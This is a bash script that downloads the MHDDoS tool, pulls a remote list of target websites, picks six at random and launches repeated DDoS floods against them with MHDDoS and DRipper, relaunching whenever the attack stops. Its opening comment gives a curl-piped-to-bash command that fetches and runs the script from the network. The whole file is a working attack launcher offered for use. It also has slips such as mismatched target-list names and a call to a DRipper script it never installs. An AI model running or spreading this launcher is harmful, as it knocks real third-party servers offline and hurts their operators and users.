#!/bin/bash
##### Use next command in local linux terminal to run this script.
#curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/MHDDoS.sh | bash
##### To kill script press CTRL+C several times.


## Check every 10 sec if MHDDos is terminated. It happens often for some reason. Re-launch if it's not running.
check_interval=10

## Number of sites to attack. Choosen from (https://github.com/KarboDuck/karbo-wiki/blob/master/MHDDoS_targets)
num_of_targets=6

# Install git if it doesn't installed already
if [ ! -f /usr/bin/git ]; then
   sudo apt install git
fi

#Install latest version of MHDDoS
cd~
rm -rf MHDDoS
git clone https://github.com/MHProDev/MHDDoS.git
cd MHDDoS
pip install -r requirements.txt > /dev/null #(no output on screen)




while true
do

   # Get number of targets in DRipper_targets
   list_size=$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/MHDDoS_targets | cat | tail -n +6 | wc -l)

   echo -e "\nNumber of targets in list: " $list_size "\n"

   # Get random numbers
   random_numbers=$(shuf -i 1-$list_size -n $num_of_targets)
   echo -e "random numbers: " $random_numbers "\n"
   
   # Print targets on screen
   echo "Choosen targets:"
   for i in $random_numbers
   do
             site=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper_targets | cat | tail -n +6)")
             echo $site
             sleep 0.2
   done
   
   sleep 2
   
   # Launch multiple MHDDoS instances
   for i in $random_numbers
   do
            site=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper_targets | cat | tail -n +6)")
            # Cut "command line" from string. Command line is verything before "#" that is used as delimiter.
            cmd_line=$(echo $site | awk -F "#" '{print $1}')

            addr=$(echo $site | awk '{print $1}')
            port=$(echo $site | awk '{print $2}')
            prot=$(echo $site | awk '{print $3}')

            #echo $addr $port $prot
            python3 -u ~/russia_ddos/DRipper.py -l 2048 -s $addr -p $port -m $prot -t 50&
   done

## check if MHDDoS running. If it's not yet running or was terminated, launch it.
if [ `ps aux | grep MHDDoS | wc -l` != "2" ]; then
        echo "MHDDoS not runnint. Time: "$(date +%H":"%M)
        python3 ~/MHDDoS/start.py $cmd_line
fi
sleep $check_interval
done
